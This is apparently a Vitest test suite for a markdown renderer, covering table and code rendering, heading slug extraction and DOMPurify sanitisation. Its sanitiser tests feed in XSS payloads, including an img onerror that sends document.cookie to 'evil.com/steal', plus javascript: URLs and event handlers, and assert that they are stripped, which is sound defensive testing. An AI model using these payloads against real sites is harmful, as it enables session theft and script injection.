import { describe, it, expect } from 'vitest';
import { renderMarkdown } from './renderer.js';

describe('renderer', () => {
  describe('gfm configuration', () => {
    it('renders tables with gfm mode', () => {
      const input = `| Header 1 | Header 2 |
|----------|----------|
| Cell 1   | Cell 2   |`;
      const { html } = renderMarkdown(input);
      expect(html).toContain('<table>');
      expect(html).toContain('<thead>');
      expect(html).toContain('<tbody>');
    });

    it('renders strikethrough', () => {
      const input = '~~deleted text~~';
      const { html } = renderMarkdown(input);
      expect(html).toContain('<del>');
    });

    it('renders autolinks', () => {
      const input = 'Visit https://example.com';
      const { html } = renderMarkdown(input);
      expect(html).toContain('<a href="https://example.com"');
    });
  });

  describe('breaks configuration', () => {
    it('converts single newlines to <br> in paragraphs', () => {
      const input = 'Line one\nLine two';
      const { html } = renderMarkdown(input);
      expect(html).toContain('<br>');
    });
  });

  describe('empty string handling', () => {
    it('returns empty string for empty input', () => {
      const { html, errors } = renderMarkdown('');
      expect(html).toBe('');
      expect(errors).toHaveLength(0);
    });

    it('returns empty string for whitespace-only input', () => {
      const { html, errors } = renderMarkdown('   \n\n  ');
      expect(html).toBe('');
      expect(errors).toHaveLength(0);
    });
  });

  describe('non-markdown input', () => {
    it('renders plain text as-is', () => {
      const input = 'Just some plain text without any markdown.';
      const { html } = renderMarkdown(input);
      expect(html).toContain('Just some plain text');
    });

    it('escapes HTML in input', () => {
      const input = '<script>alert("xss")</script>';
      const { html } = renderMarkdown(input);
      expect(html).not.toContain('<script>');
      expect(html).not.toContain('alert');
    });
  });

  describe('code highlighting', () => {
    it('highlights code blocks with language', () => {
      const input = '```javascript\nconst x = 1;\n```';
      const { html } = renderMarkdown(input);
      expect(html).toContain('hljs');
      expect(html).toContain('language-javascript');
    });

    it('highlights code blocks without language', () => {
      const input = '```\nsome code\n```';
      const { html } = renderMarkdown(input);
      expect(html).toContain('hljs');
    });
  });
});

describe('DOMPurify', () => {
  describe('dangerous HTML filtering', () => {
    it('filters script tags', () => {
      const input = '<script>alert("xss")</script>Hello';
      const { html } = renderMarkdown(input);
      expect(html).not.toContain('<script>');
    });

    it('filters onclick handlers', () => {
      const input = '<div onclick="alert(1)">Click me</div>';
      const { html } = renderMarkdown(input);
      expect(html).not.toContain('onclick');
    });

    it('filters javascript: URLs', () => {
      const input = '<a href="javascript:alert(1)">Link</a>';
      const { html } = renderMarkdown(input);
      expect(html).not.toContain('javascript:');
    });

    it('filters onerror handlers', () => {
      const input = '<img src="x" onerror="alert(1)">';
      const { html } = renderMarkdown(input);
      expect(html).not.toContain('onerror');
    });

    it('filters data: URLs', () => {
      const input = '<a href="data:text/html,<script>alert(1)</script>">Link</a>';
      const { html } = renderMarkdown(input);
      expect(html).not.toContain('data:');
    });

    it('allows safe HTML tags', () => {
      const input = '<table><tr><td>Cell</td></tr></table>';
      const { html } = renderMarkdown(input);
      expect(html).toContain('<table>');
      expect(html).toContain('<td>');
    });

    it('filters iframe tags', () => {
      const input = '<iframe src="https://evil.com"></iframe>';
      const { html } = renderMarkdown(input);
      expect(html).not.toContain('<iframe>');
    });

    it('filters form tags', () => {
      const input = '<form action="https://evil.com"><input name="q"></form>';
      const { html } = renderMarkdown(input);
      expect(html).not.toContain('<form>');
    });
  });
});

describe('HTML embedding', () => {
  describe('details and summary', () => {
    it('renders details/summary collapsible block', () => {
      const input = '<details><summary>Click to expand</summary><p>Hidden content</p></details>';
      const { html } = renderMarkdown(input);
      expect(html).toContain('<details>');
      expect(html).toContain('<summary>');
      expect(html).toContain('Click to expand');
      expect(html).toContain('Hidden content');
    });

    it('renders details with open attribute', () => {
      const input = '<details open><summary>Already open</summary><p>Content visible by default</p></details>';
      const { html } = renderMarkdown(input);
      expect(html).toContain('<details open');
    });
  });

  describe('HTML tables', () => {
    it('renders complex HTML table', () => {
      const input = `<table>
  <thead>
    <tr><th>Name</th><th>Score</th></tr>
  </thead>
  <tbody>
    <tr><td>Alice</td><td>98</td></tr>
    <tr><td>Bob</td><td>87</td></tr>
  </tbody>
</table>`;
      const { html } = renderMarkdown(input);
      expect(html).toContain('<table>');
      expect(html).toContain('<thead>');
      expect(html).toContain('<tbody>');
      expect(html).toContain('<th>Name</th>');
      expect(html).toContain('<td>Alice</td>');
    });
  });

  describe('HTML badges', () => {
    it('renders badge link with image', () => {
      const input = '<a href="https://example.com"><img src="https://img.shields.io/badge/Test-passing-brightgreen" alt="Test"></a>';
      const { html } = renderMarkdown(input);
      expect(html).toContain('<a ');
      expect(html).toContain('<img ');
      expect(html).toContain('shields.io');
    });

    it('renders multiple inline badges', () => {
      const input = '<a href="https://github.com"><img src="badge1" alt="b1"></a> <a href="https://example.com"><img src="badge2" alt="b2"></a>';
      const { html } = renderMarkdown(input);
      const matches = html.match(/<a /g);
      expect(matches).toHaveLength(2);
    });
  });

  describe('inline HTML elements', () => {
    it('renders span elements', () => {
      const input = '<span class="highlight">highlighted text</span>';
      const { html } = renderMarkdown(input);
      expect(html).toContain('<span');
      expect(html).toContain('highlighted text');
    });

    it('renders div elements', () => {
      const input = '<div class="custom-block">Custom content</div>';
      const { html } = renderMarkdown(input);
      expect(html).toContain('<div');
      expect(html).toContain('Custom content');
    });

    it('renders nested HTML structures', () => {
      const input = '<div><p>Paragraph inside div</p><ul><li>Item 1</li><li>Item 2</li></ul></div>';
      const { html } = renderMarkdown(input);
      expect(html).toContain('<div>');
      expect(html).toContain('<p>');
      expect(html).toContain('<li>Item 1</li>');
    });
  });
});

describe('XSS injection scenarios', () => {
  it('blocks img with onerror XSS', () => {
    const input = '<img src="x" onerror="document.location=\'https://evil.com/steal?c=\'+document.cookie">';
    const { html } = renderMarkdown(input);
    expect(html).not.toContain('onerror');
    expect(html).not.toContain('document.cookie');
  });

  it('blocks a with javascript: onclick pseudo-protocol', () => {
    const input = '<a href="javascript:void(0)" onclick="alert(1)">click</a>';
    const { html } = renderMarkdown(input);
    expect(html).not.toContain('javascript:');
    expect(html).not.toContain('onclick');
  });

  it('blocks SVG-based XSS', () => {
    const input = '<svg/onload=alert(1)>';
    const { html } = renderMarkdown(input);
    // marked treats bare <svg... as text and escapes it, so no <svg tag is parsed
    expect(html).not.toContain('<svg');
  });

  it('blocks style tag with expression', () => {
    const input = '<div style="width: expression(alert(1))">XSS</div>';
    const { html } = renderMarkdown(input);
    expect(html).not.toContain('expression');
  });

  it('blocks meta refresh redirect', () => {
    const input = '<meta http-equiv="refresh" content="0;url=https://evil.com">';
    const { html } = renderMarkdown(input);
    expect(html).not.toContain('<meta');
    expect(html).not.toContain('refresh');
  });

  it('blocks embed/object Flash-based XSS', () => {
    const input = '<embed src="https://evil.com/x.swf">';
    const { html } = renderMarkdown(input);
    expect(html).not.toContain('<embed>');
  });

  it('blocks link tag with javascript URL', () => {
    const input = '<link rel="stylesheet" href="javascript:alert(1)">';
    const { html } = renderMarkdown(input);
    expect(html).not.toContain('javascript:');
  });

  it('blocks body onload XSS', () => {
    const input = '<body onload="alert(1)">content</body>';
    const { html } = renderMarkdown(input);
    expect(html).not.toContain('onload');
  });

  it('allows safe relative URLs', () => {
    const input = '<a href="/path/to/file">Safe link</a>';
    const { html } = renderMarkdown(input);
    expect(html).toContain('href="/path/to/file"');
  });

  it('allows https URLs', () => {
    const input = '<a href="https://example.com">HTTPS Link</a>';
    const { html } = renderMarkdown(input);
    expect(html).toContain('href="https://example.com"');
  });
});

describe('heading extraction', () => {
  describe('H1-H3 extraction', () => {
    it('extracts H1 headings', () => {
      const input = '# Hello World';
      const { headings } = renderMarkdown(input);
      expect(headings).toHaveLength(1);
      expect(headings[0]).toEqual({ level: 1, text: 'Hello World', id: 'hello-world' });
    });

    it('extracts H2 headings', () => {
      const input = '## Section Two';
      const { headings } = renderMarkdown(input);
      expect(headings).toHaveLength(1);
      expect(headings[0]).toEqual({ level: 2, text: 'Section Two', id: 'section-two' });
    });

    it('extracts H3 headings', () => {
      const input = '### Subsection';
      const { headings } = renderMarkdown(input);
      expect(headings).toHaveLength(1);
      expect(headings[0]).toEqual({ level: 3, text: 'Subsection', id: 'subsection' });
    });

    it('extracts multiple headings of different levels', () => {
      const input = '# Title\n\n## Section\n\n### Subsection\n\nParagraph';
      const { headings } = renderMarkdown(input);
      expect(headings).toHaveLength(3);
      expect(headings[0]).toEqual({ level: 1, text: 'Title', id: 'title' });
      expect(headings[1]).toEqual({ level: 2, text: 'Section', id: 'section' });
      expect(headings[2]).toEqual({ level: 3, text: 'Subsection', id: 'subsection' });
    });
  });

  describe('H4+ ignored', () => {
    it('ignores H4 headings', () => {
      const input = '# H1\n\n#### H4 Heading\n\n## H2';
      const { headings } = renderMarkdown(input);
      expect(headings).toHaveLength(2);
      expect(headings.map(h => h.level)).toEqual([1, 2]);
    });

    it('ignores H5 and H6 headings', () => {
      const input = '##### H5\n\n###### H6';
      const { headings } = renderMarkdown(input);
      expect(headings).toHaveLength(0);
    });

    it('extracts H1-H3 even when H4+ present', () => {
      const input = '# Title\n\n#### H4\n\n## Section\n\n##### H5\n\n### H3';
      const { headings } = renderMarkdown(input);
      expect(headings).toHaveLength(3);
      expect(headings.map(h => h.level)).toEqual([1, 2, 3]);
    });
  });

  describe('slug ID generation', () => {
    it('generates lowercase hyphenated IDs', () => {
      const input = '# Hello World';
      const { headings } = renderMarkdown(input);
      expect(headings[0].id).toBe('hello-world');
    });

    it('handles multiple words', () => {
      const input = '# This Is A Long Heading';
      const { headings } = renderMarkdown(input);
      expect(headings[0].id).toBe('this-is-a-long-heading');
    });
  });

  describe('duplicate heading handling', () => {
    it('generates unique IDs for duplicate headings', () => {
      const input = '## Duplicate\n\n## Duplicate';
      const { headings } = renderMarkdown(input);
      expect(headings).toHaveLength(2);
      expect(headings[0].id).toBe('duplicate');
      expect(headings[1].id).toBe('duplicate-1');
    });

    it('handles three duplicate headings', () => {
      const input = '## Same\n\n## Same\n\n## Same';
      const { headings } = renderMarkdown(input);
      expect(headings).toHaveLength(3);
      expect(headings[0].id).toBe('same');
      expect(headings[1].id).toBe('same-1');
      expect(headings[2].id).toBe('same-2');
    });

    it('duplicate detection is case-insensitive', () => {
      const input = '## Title\n\n## title\n\n## TITLE';
      const { headings } = renderMarkdown(input);
      expect(headings[0].id).toBe('title');
      expect(headings[1].id).toBe('title-1');
      expect(headings[2].id).toBe('title-2');
    });
  });

  describe('special characters', () => {
    it('handles headings with special characters', () => {
      const input = '# Hello @#$%^&*()';
      const { headings } = renderMarkdown(input);
      expect(headings[0].id).toBe('hello');
    });

    it('handles headings with unicode characters', () => {
      const input = '# Hello World';
      const { headings } = renderMarkdown(input);
      expect(headings[0].id).toBe('hello-world');
    });

    it('handles heading with only special characters', () => {
      const input = '# @#$%';
      const { headings } = renderMarkdown(input);
      // Falls back to 'heading' when slug is empty
      expect(headings[0].id).toBe('heading');
    });

    it('handles heading with leading/trailing special chars', () => {
      const input = '# ---hello---';
      const { headings } = renderMarkdown(input);
      expect(headings[0].id).toBe('hello');
    });
  });

  describe('empty document handling', () => {
    it('returns empty array for document with no headings', () => {
      const input = 'Just a paragraph with no headings.';
      const { headings } = renderMarkdown(input);
      expect(headings).toHaveLength(0);
    });

    it('returns empty array for empty input', () => {
      const { headings } = renderMarkdown('');
      expect(headings).toHaveLength(0);
    });

    it('returns empty array for whitespace-only input', () => {
      const { headings } = renderMarkdown('   \n\n  ');
      expect(headings).toHaveLength(0);
    });
  });
});
